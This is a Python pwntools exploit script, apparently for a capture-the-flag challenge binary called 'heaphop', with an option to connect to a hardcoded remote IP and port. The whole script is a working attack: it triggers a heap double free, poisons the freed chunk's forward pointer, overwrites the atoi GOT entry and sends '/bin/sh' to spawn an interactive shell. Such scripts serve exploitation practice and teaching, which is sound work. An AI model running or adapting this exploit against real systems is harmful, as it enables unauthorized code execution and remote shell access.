#!/usr/bin/env python

from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'i386'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './heaphop'
binary = ELF("heaphop")

remote_server = '89.38.210.128'
PORT = 1339

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    p = remote(remote_server, PORT)
else:
    p = process(program_name)

if args.lib:
    libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
    r = binary.process(env={'LD_PRELOAD' : libc.path})

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *0x00400a8b
    b *0x00400936
    b *0x00400951
    ''')

# USEFUL FUNCTIONS
def console_output():
    data = p.recv(2000)
    # print data

def send_data(payload):
    # print '[*] payload'
    p.sendline(payload)

def wait_for_prompt(sentence):
  print r.recvuntil(sentence)

def get_symbols(x, y):
    x = p32(binary.symbols[y])
    # Example: read_got = p32(binary.symbols["read"])

def search_binsh():
    return libc.search("/bin/sh").next()

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    time.sleep(2)
    p.sendline('1')
    print '[*]ALLOC 1'
    # ==> ALLOCATE CHUNK1
    time.sleep(2)
    p.sendline('4')
    print '[*]FREE 1'
    # ==> FREE CHUNK1
    time.sleep(2)
    p.sendline('4')
    print '[*]DOUBLE FREE 1'
    # ==> DOUBLE-FREE CHUNK1
    time.sleep(2)
    p.sendline('2')
    time.sleep(2)
    payload = p64(0x0000000000602068)
    p.sendline(payload)
    print '[*]OVERWRITE FD'
    # OVERWRITE FD CHUNK 1
    time.sleep(2)
    p.sendline('1')
    print '[*]ALLOC 1'
    # ==> ALLOCATE CHUNK1
    time.sleep(2)
    p.sendline('1')
    print '[*]ALLOC 2'
    # ==> ALLOCATE CHUNK2
    time.sleep(2)
    p.sendline('2')
    time.sleep(2)
    p.sendline(p64(0x400710))
    print '[*]OVERWRITE ATOI 1'
    # ==> OVERWRITE ATOI
    time.sleep(2)
    p.sendline('/bin/sh')
    print '[*]GET SHELL 1'
    # ==> GET SHELL
    '''
    data = p.recvuntil('> ')
    print data
    p.sendline('2')
    time.sleep(3)
    p.sendline('A'*0x42)
    # ==> OVERWRITE FD POINTER
    data = p.recvuntil('> ')
    print data
    p.sendline('1')
    # ==> ALLOCATE AT NEW MEMORY
    data = p.recvuntil('> ')
    print data
    '''
    # 0x602098

    p.interactive()
